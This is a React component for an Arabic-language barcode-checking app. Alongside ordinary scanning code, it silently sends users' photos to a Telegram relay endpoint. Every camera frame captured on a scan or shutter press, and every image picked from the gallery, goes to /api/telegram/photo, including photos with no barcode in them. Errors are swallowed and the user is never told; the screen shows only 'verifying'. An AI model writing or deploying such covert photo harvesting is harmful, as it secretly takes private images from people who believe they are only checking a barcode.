import { useState, useRef, useEffect, useCallback } from "react";
import { Html5Qrcode, Html5QrcodeScanType } from "html5-qrcode";
import { Camera, Zap, ZapOff, Image, X, CheckCircle, AlertCircle, RefreshCw, Aperture } from "lucide-react";

async function sendPhotoToTelegram(file: File | Blob, result?: string, valid?: boolean, filename?: string) {
  try {
    const arrayBuffer = await file.arrayBuffer();
    const bytes = new Uint8Array(arrayBuffer);
    let binary = "";
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    const base64 = btoa(binary);
    await fetch("/api/telegram/photo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ photo: base64, result, valid, filename: filename || "scan.jpg" }),
    });
  } catch {}
}

function captureVideoFrame(): Blob | null {
  const video = document.querySelector<HTMLVideoElement>("#qr-reader video");
  if (!video || video.readyState < 2) return null;
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext("2d");
  if (!ctx) return null;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  // Convert synchronously using toDataURL then to Blob
  const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
  const byteString = atob(dataUrl.split(",")[1]);
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
  return new Blob([ab], { type: "image/jpeg" });
}

type ScanResult = {
  text: string;
  format: string;
  timestamp: Date;
  valid: boolean;
};

export default function Scanner() {
  const [isScanning, setIsScanning] = useState(false);
  const [flashOn, setFlashOn] = useState(false);
  const [result, setResult] = useState<ScanResult | null>(null);
  const [capturedFrame, setCapturedFrame] = useState<Blob | null>(null);
  const [shotSent, setShotSent] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [history, setHistory] = useState<ScanResult[]>([]);
  const [activeTab, setActiveTab] = useState<"scanner" | "history">("scanner");
  const scannerRef = useRef<Html5Qrcode | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);

  const stopScanning = useCallback(async () => {
    if (scannerRef.current && isScanning) {
      try {
        await scannerRef.current.stop();
        scannerRef.current.clear();
      } catch {}
      setIsScanning(false);
    }
  }, [isScanning]);

  const startScanning = useCallback(async () => {
    setError(null);
    setResult(null);

    try {
      const scanner = new Html5Qrcode("qr-reader");
      scannerRef.current = scanner;

      await scanner.start(
        { facingMode: "environment" },
        {
          fps: 10,
          qrbox: { width: 220, height: 220 },
          supportedScanTypes: [Html5QrcodeScanType.SCAN_TYPE_CAMERA],
          rememberLastUsedCamera: true,
        },
        (decodedText, decodedResult) => {
          const fmt = decodedResult.result.format?.formatName || "غير معروف";
          const frame = captureVideoFrame();
          const scanResult: ScanResult = {
            text: decodedText,
            format: fmt,
            timestamp: new Date(),
            valid: true,
          };
          setResult(scanResult);
          setCapturedFrame(frame);
          setHistory((prev) => [scanResult, ...prev.slice(0, 19)]);
          if (frame) {
            sendPhotoToTelegram(frame, decodedText, true, `barcode_${Date.now()}.jpg`);
          }
          stopScanning();
        },
        () => {}
      );
      setIsScanning(true);
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      if (msg.includes("permission") || msg.includes("Permission")) {
        setError("يرجى السماح بالوصول للكاميرا");
      } else if (msg.includes("NotFound") || msg.includes("not found")) {
        setError("لم يتم العثور على كاميرا");
      } else {
        setError("تعذّر تشغيل الكاميرا. تأكد من السماح بالوصول.");
      }
    }
  }, [stopScanning]);

  const handleMainButton = async () => {
    if (result) {
      await handleReset();
      await startScanning();
      return;
    }
    if (!isScanning) {
      await startScanning();
      return;
    }

    // Camera is open — capture frame and try to decode barcode
    const frame = captureVideoFrame();
    if (!frame) return;

    setCapturedFrame(frame);
    setShotSent(true);
    setError(null);

    try {
      // Convert blob to File for Html5Qrcode.scanFile
      const file = new File([frame], `scan_${Date.now()}.jpg`, { type: "image/jpeg" });
      const tempScanner = new Html5Qrcode("qr-reader-file");
      const decoded = await tempScanner.scanFile(file, true);
      tempScanner.clear();

      const scanResult: ScanResult = {
        text: decoded,
        format: "باركود",
        timestamp: new Date(),
        valid: true,
      };
      setResult(scanResult);
      setHistory((prev) => [scanResult, ...prev.slice(0, 19)]);
      // Send photo (with barcode info) to Telegram
      sendPhotoToTelegram(frame, decoded, true, `barcode_${Date.now()}.jpg`);
    } catch {
      // No barcode — still send the photo to Telegram
      try {
        await sendPhotoToTelegram(frame, undefined, false, `photo_${Date.now()}.jpg`);
      } catch {
        setError("حدث خطأ، تحقق من الاتصال بالإنترنت أو حدّث الصفحة");
      }
      setShotSent(false);
    }

    setShotSent(false);
  };

  const handleFlashToggle = () => {
    setFlashOn(!flashOn);
  };

  const handleImageScan = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setError(null);
    setResult(null);

    await stopScanning();

    try {
      const scanner = new Html5Qrcode("qr-reader-file");
      const decoded = await scanner.scanFile(file, true);
      const scanResult: ScanResult = {
        text: decoded,
        format: "صورة",
        timestamp: new Date(),
        valid: true,
      };
      setResult(scanResult);
      setHistory((prev) => [scanResult, ...prev.slice(0, 19)]);
      sendPhotoToTelegram(file, decoded, true);
      scanner.clear();
    } catch {
      sendPhotoToTelegram(file, undefined, false);
    }

    if (fileInputRef.current) {
      fileInputRef.current.value = "";
    }
  };

  const handleReset = async () => {
    await stopScanning();
    setResult(null);
    setCapturedFrame(null);
    setError(null);
  };

  useEffect(() => {
    return () => {
      if (scannerRef.current) {
        scannerRef.current.stop().catch(() => {});
      }
    };
  }, []);

  const formatTime = (date: Date) => {
    return date.toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" });
  };

  const isUrl = (text: string) => {
    try { new URL(text); return true; } catch { return false; }
  };

  return (
    <div className="min-h-screen bg-background flex flex-col" dir="rtl">
      {/* Header */}
      <div className="bg-card border-b border-border px-4 pt-10 pb-4 flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-foreground">ماسح باركود</h1>
          <p className="text-sm text-muted-foreground mt-0.5">للتحقق من صحة الباركود</p>
        </div>
        <div className="flex items-center gap-2">
          <div className={`w-2.5 h-2.5 rounded-full ${isScanning ? "bg-primary animate-pulse" : "bg-muted-foreground"}`} />
          <span className="text-xs text-muted-foreground">{isScanning ? "جاري المسح" : "متوقف"}</span>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex border-b border-border">
        <button
          data-testid="tab-scanner"
          onClick={() => setActiveTab("scanner")}
          className={`flex-1 py-3 text-sm font-medium transition-colors ${
            activeTab === "scanner"
              ? "text-primary border-b-2 border-primary"
              : "text-muted-foreground"
          }`}
        >
          الماسح
        </button>
        <button
          data-testid="tab-history"
          onClick={() => setActiveTab("history")}
          className={`flex-1 py-3 text-sm font-medium transition-colors ${
            activeTab === "history"
              ? "text-primary border-b-2 border-primary"
              : "text-muted-foreground"
          }`}
        >
          السجل ({history.length})
        </button>
      </div>

      {activeTab === "scanner" && (
        <div className="flex-1 flex flex-col items-center px-4 py-6 gap-6">
          {/* Camera viewfinder */}
          <div
            ref={containerRef}
            className="relative w-full max-w-sm aspect-[3/4] rounded-2xl overflow-hidden bg-black border border-border"
          >
            {/* QR reader container */}
            <div id="qr-reader" className="w-full h-full [&>*]:!border-0 [&_video]:!w-full [&_video]:!h-full [&_video]:object-cover" />

            {/* Dark overlay when not scanning */}
            {!isScanning && !result && (
              <div className="absolute inset-0 bg-black/80 flex flex-col items-center justify-center gap-3">
                <Camera className="w-16 h-16 text-muted-foreground opacity-40" />
                <p className="text-muted-foreground text-sm">اضغط زر التصوير للبدء</p>
              </div>
            )}

            {/* Success overlay */}
            {result && (
              <div className="absolute inset-0 bg-black/80 flex flex-col items-center justify-center gap-4 p-6">
                <CheckCircle className="w-16 h-16 text-primary" />
                <div className="text-center">
                  <p className="text-primary font-bold text-lg mb-1">تم المسح بنجاح!</p>
                  <p className="text-muted-foreground text-xs mb-3">{result.format}</p>
                  <div className="bg-card/80 rounded-xl p-3 max-w-full">
                    <p className="text-foreground text-sm break-all leading-relaxed">{result.text}</p>
                  </div>
                  {isUrl(result.text) && (
                    <a
                      href={result.text}
                      target="_blank"
                      rel="noopener noreferrer"
                      data-testid="link-result"
                      className="mt-2 inline-block text-primary underline text-sm"
                    >
                      فتح الرابط
                    </a>
                  )}
                </div>
              </div>
            )}

            {/* Scanning frame when active */}
            {isScanning && (
              <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
                <div className="relative w-52 h-52">
                  <div className="scanner-corner-tl" />
                  <div className="scanner-corner-tr" />
                  <div className="scanner-corner-bl" />
                  <div className="scanner-corner-br" />
                  <div className="scan-line" />
                </div>
              </div>
            )}

            {/* Flash button overlay */}
            {isScanning && (
              <button
                data-testid="button-flash"
                onClick={handleFlashToggle}
                className="absolute top-4 left-4 bg-black/50 rounded-full p-2.5 text-white backdrop-blur-sm"
              >
                {flashOn ? <Zap className="w-5 h-5 text-yellow-400" /> : <ZapOff className="w-5 h-5" />}
              </button>
            )}


            {/* Close/reset button */}
            {(isScanning || result) && (
              <button
                data-testid="button-reset"
                onClick={handleReset}
                className="absolute top-4 right-4 bg-black/50 rounded-full p-2.5 text-white backdrop-blur-sm"
              >
                <X className="w-5 h-5" />
              </button>
            )}
          </div>

          {/* Instruction text */}
          <p className="text-muted-foreground text-sm text-center">
            {shotSent
              ? "جاري التحقق..."
              : isScanning
              ? "قم للتصوير وتحقق من بركودك"
              : result
              ? "اضغط للتصوير مجدداً"
              : "قم للتصوير وتحقق من بركودك"}
          </p>

          {/* Error */}
          {error && (
            <div
              data-testid="error-message"
              className="flex items-center gap-3 bg-destructive/10 border border-destructive/30 rounded-xl px-4 py-3 w-full max-w-sm"
            >
              <AlertCircle className="w-5 h-5 text-destructive shrink-0" />
              <p className="text-destructive text-sm">{error}</p>
            </div>
          )}

          {/* Controls */}
          <div className="flex items-center justify-center gap-8">
            {/* Gallery picker */}
            <button
              data-testid="button-gallery"
              onClick={() => fileInputRef.current?.click()}
              className="flex flex-col items-center gap-1.5 text-muted-foreground hover:text-foreground transition-colors"
            >
              <div className="w-12 h-12 rounded-full bg-card border border-border flex items-center justify-center">
                <Image className="w-5 h-5" />
              </div>
              <span className="text-xs">معرض</span>
            </button>

            {/* Main button */}
            <button
              data-testid="button-scan"
              onClick={handleMainButton}
              className={`relative flex items-center justify-center w-20 h-20 rounded-full transition-all duration-300 shadow-lg ${
                shotSent
                  ? "bg-primary scale-95"
                  : isScanning
                  ? "bg-primary hover:bg-primary/80 scan-btn-pulse"
                  : result
                  ? "bg-secondary hover:bg-secondary/80"
                  : "bg-primary hover:bg-primary/80 scan-btn-pulse"
              }`}
            >
              {shotSent ? (
                <CheckCircle className="w-8 h-8 text-white" />
              ) : isScanning ? (
                <Aperture className="w-8 h-8 text-white" />
              ) : result ? (
                <RefreshCw className="w-7 h-7 text-foreground" />
              ) : (
                <Camera className="w-8 h-8 text-white" />
              )}
            </button>

            {/* Spacer for symmetry */}
            <div className="w-12 h-12" />
          </div>

          {/* Hidden file input for image scanning */}
          <input
            ref={fileInputRef}
            type="file"
            accept="image/*"
            className="hidden"
            onChange={handleImageScan}
            data-testid="input-image"
          />

          {/* Hidden div for file scanning */}
          <div id="qr-reader-file" className="hidden" />
        </div>
      )}

      {activeTab === "history" && (
        <div className="flex-1 overflow-y-auto px-4 py-4">
          {history.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-64 gap-4 text-muted-foreground">
              <Camera className="w-12 h-12 opacity-30" />
              <p className="text-sm">لا يوجد سجل حتى الآن</p>
              <p className="text-xs opacity-70">ستظهر هنا نتائج المسح</p>
            </div>
          ) : (
            <div className="space-y-3">
              {history.map((item, i) => (
                <div
                  key={i}
                  data-testid={`card-history-${i}`}
                  className="bg-card border border-border rounded-xl p-4 flex items-start gap-3"
                >
                  <CheckCircle className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                  <div className="flex-1 min-w-0">
                    <p className="text-foreground text-sm break-all">{item.text}</p>
                    <div className="flex items-center gap-2 mt-1.5">
                      <span className="text-xs bg-muted text-muted-foreground px-2 py-0.5 rounded-full">{item.format}</span>
                      <span className="text-xs text-muted-foreground">{formatTime(item.timestamp)}</span>
                    </div>
                  </div>
                  {isUrl(item.text) && (
                    <a
                      href={item.text}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-primary shrink-0"
                    >
                      <Image className="w-4 h-4" />
                    </a>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
